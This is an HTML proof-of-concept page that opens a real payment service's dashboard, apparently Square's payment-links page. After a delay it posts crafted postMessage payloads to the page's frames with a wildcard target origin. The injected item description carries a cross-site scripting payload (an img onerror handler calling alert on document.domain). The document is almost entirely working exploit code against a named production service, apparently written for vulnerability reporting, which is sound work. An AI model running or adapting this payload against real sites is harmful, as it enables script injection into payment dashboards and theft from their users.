<!DOCTYPE html>
<html>
<head>
  <title>postMessage PoC</title>
</head>
<body>

  <script>
    var w = window.open('https://app.squareup.com/dashboard/payment-links/new');

setTimeout(function() {
      for(var i=0; i<10; i++) {
          try {
              w.frames[i].postMessage({
                  name:'LINK_PREVIEW',
                  data:{type:'INITIALIZE',uuid:'x',data:{
                      checkout_link:{id:'l',link_type:'ITEM_LINK',checkout_link_data:{name:'P',link_type:'ITEM_LINK',order_details:{line_items:[{item_id:'i',quantity:{quantity:1}}]}}},
                      related_objects:[{type:'ITEM',id:'i',item_data:{name:'HACKED',description_html:'',description:'<img src=x onerror=alert(document.domain)>',variations:[{type:'ITEM_VARIATION',id:'v',item_variation_data:{item_id:'i',name:'D',pricing_type:'FIXED_PRICING',price_money:{amount:100,currency:'USD'}}}]}}],
                      settings:{checkout_title:'HACKED'}
                  }}
              },'*');
          } catch(e){}
      }
  }, 5000);
  </script>
</body>
</html>
